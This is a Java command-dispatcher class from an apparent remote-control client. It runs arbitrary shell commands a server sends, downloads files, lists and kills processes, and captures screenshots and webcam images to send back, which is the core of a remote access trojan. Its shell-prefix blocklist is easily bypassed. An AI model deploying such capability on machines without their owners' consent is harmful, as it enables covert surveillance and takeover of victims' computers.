package ch.wetwer.client.handler;

import ch.wetwer.client.configure.ClientValues;
import ch.wetwer.client.console.Console;
import ch.wetwer.client.service.DesktopService;
import ch.wetwer.client.service.DownloadService;
import ch.wetwer.client.service.ImageService;
import ch.wetwer.client.service.KillService;
import ch.wetwer.client.service.ListService;
import ch.wetwer.client.service.PrinterService;
import ch.wetwer.client.service.ProcessService;
import ch.wetwer.client.service.chat.Chat;

import java.util.Collections;
import java.util.List;

/**
 * @author Wetwer
 * @project server-control
 **/

public class CommandReader {
    public static void read() {
        try {
            String command = ClientValues.commandReader.getContent();
            if (!command.equals("")) {
                if (!functions(command)) {
                    if (!command.startsWith("cmd") && !command.startsWith("bash") && !command.startsWith("wmic")) {
                        try {
                            List<String> responses = Console.execute(command);

                            assert responses != null;
                            Collections.reverse(responses);

                            for (String commandResponse : responses) {
                                if (command.startsWith(">ERROR")) {
                                    new ResponseSender("error", commandResponse.replace(">ERROR", ""));
                                } else {
                                    new ResponseSender("response", commandResponse);
                                }
                            }
                            new ResponseSender().reset();
                        } catch (NullPointerException e) {
                            new ResponseSender("error", "No command '" + command + "' found");
                            new ResponseSender().reset();
                        }

                    } else {
                        new ResponseSender("error", "Command '" + command + "' not allowed");
                        new ResponseSender().reset();
                    }
                }

            } else {
                new ResponseSender("status", "online");
            }
        } catch (ArrayIndexOutOfBoundsException e) {
            e.printStackTrace();
        }
    }

    private static boolean functions(String command) {
        boolean isFunction = true;
        if (command.startsWith("ls")) {
            new ListService().listFiles(command);
        } else if (command.equals("pwd")) {
            new ResponseSender("response", "Java Home   | " + System.getProperty("java.home"));
            new ResponseSender("response", "Home Dir    | " + System.getProperty("user.home"));
            new ResponseSender("response", "Current Dir | " + System.getProperty("user.dir"));
            new ResponseSender().reset();
        } else if (command.equals("kill")) {
            new KillService().kill();
            new ResponseSender().reset();
        } else if (command.equals("desktop")) {
            new DesktopService().showDesktop();
            new ResponseSender().reset();
        } else if (command.equals("printer")) {
            new PrinterService().getPrinters();
            new ResponseSender().reset();
        } else if (command.startsWith("download")) {
            new DownloadService().download(command.split(" ")[1], command.split(" ")[2]);
            new ResponseSender().reset();
        } else if (command.startsWith("chat")) {
            Chat chat = Chat.getInstance();
            chat.addMessage("Morgan", command.replace("chat ", ""));
            new ResponseSender().reset();
        } else if (command.equals("screenshot")) {
            new ImageService().sendImgBytes(new ImageService().takeScreenshot());
            new ResponseSender().reset();
        } else if (command.equals("webcam")) {
            new ImageService().sendImgBytes(new ImageService().webcamCapture());
            new ResponseSender().reset();
        } else if (command.equals("tasks")) {
            new ProcessService().getRunningProcesses();
            new ResponseSender().reset();
        } else {
            isFunction = false;
        }

        return isFunction;
    }
}
